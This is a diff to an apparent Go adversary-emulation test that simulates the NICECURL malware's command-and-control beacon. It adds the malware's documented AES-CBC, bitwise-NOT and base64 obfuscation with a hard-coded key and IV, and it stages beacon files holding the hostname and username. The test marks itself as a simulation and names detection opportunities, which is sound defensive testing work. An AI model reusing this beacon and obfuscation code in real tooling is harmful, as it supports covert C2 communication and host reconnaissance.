@@ -18,6 +18,9 @@ Detection opportunities:
 package main
 
 import (
+	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
 	"encoding/base64"
 	"fmt"
 	"os"
@@ -113,7 +116,7 @@ func performTechnique() error {
 	}
 
 	// Build beacon in NICECURL's format
-	beacon := fmt.Sprintf("vid=%s&h=%s&u=%s&t=%d&ver=NICECURL/2.0",
+	beacon := fmt.Sprintf("vid=%s&h=%s&u=%s&t=%d&ver=NICECURL/2.0&marker=F0RT1KA_SIMULATION_ARTIFACT_NOT_REAL_MALWARE",
 		victimID, hostname, username, time.Now().Unix())
 	encodedBeacon := base64.StdEncoding.EncodeToString([]byte(beacon))
 
@@ -131,6 +134,21 @@ func performTechnique() error {
 		return fmt.Errorf("failed to write beacon staging file: %v", err)
 	}
 	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Beacon staged: %s (%d bytes)", beaconFile, len(encodedBeacon)))
+
+	// Apply NICECURL's documented obfuscation pipeline: AES-CBC -> bitwise NOT -> base64
+	LogMessage("INFO", TECHNIQUE_ID, "Applying NICECURL obfuscation pipeline: AES-CBC(key=kNz0...) -> bitwise NOT -> base64")
+	encryptedBeacon, aesErr := encryptAESCBC([]byte(beacon))
+	if aesErr != nil {
+		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("AES-CBC encryption failed: %v", aesErr))
+	} else {
+		obfuscatedEncrypted := bitwiseNOT(encryptedBeacon)
+		encodedEncryptedBeacon := base64.StdEncoding.EncodeToString(obfuscatedEncrypted)
+
+		encBeaconFile := filepath.Join(stagingDir, "nicecurl_beacon_encrypted.dat")
+		os.WriteFile(encBeaconFile, []byte(encodedEncryptedBeacon), 0644)
+		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Full NICECURL pipeline beacon staged: %s (%d bytes)", encBeaconFile, len(encodedEncryptedBeacon)))
+		LogMessage("INFO", TECHNIQUE_ID, "Detection opportunity: AES-CBC + bitwise NOT obfuscated C2 beacon matches NICECURL signature")
+	}
 
 	// Step 4: Execute curl.exe with Glitch-themed C2 endpoints
 	// These are non-existent domains that model the real C2 pattern.
@@ -234,13 +252,38 @@ func performTechnique() error {
 	LogMessage("INFO", TECHNIQUE_ID, "C2 simulation complete: curl.exe used for HTTPS POST to Glitch-themed endpoints")
 	LogMessage("INFO", TECHNIQUE_ID, "Detection points: curl.exe HTTPS POST, Glitch.me domain, base64 beacon data, custom User-Agent")
 
-	// Cleanup staging directory
-	defer func() {
-		os.RemoveAll(stagingDir)
-		LogMessage("INFO", TECHNIQUE_ID, "C2 staging directory cleaned up")
-	}()
-
 	return nil
+}
+
+// bitwiseNOT implements NICECURL's obfuscation: f(b) = NOT(b) mod 256
+func bitwiseNOT(data []byte) []byte {
+	result := make([]byte, len(data))
+	for i, b := range data {
+		result[i] = ^b
+	}
+	return result
+}
+
+// encryptAESCBC implements NICECURL's AES encryption with documented hard-coded key/IV
+func encryptAESCBC(plaintext []byte) ([]byte, error) {
+	// Hard-coded key and IV from NICECURL threat intelligence
+	key := []byte("kNz0CXiP0wEQnhZXYbvraigXvRVYHk1B") // 32 bytes = AES-256
+	iv := []byte("0T9r1y1M2e0N0o1w")                     // 16 bytes IV
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+
+	// PKCS7 padding
+	padding := aes.BlockSize - len(plaintext)%aes.BlockSize
+	padtext := append(plaintext, bytes.Repeat([]byte{byte(padding)}, padding)...)
+
+	ciphertext := make([]byte, len(padtext))
+	mode := cipher.NewCBCEncrypter(block, iv)
+	mode.CryptBlocks(ciphertext, padtext)
+
+	return ciphertext, nil
 }
 
 // ==============================================================================
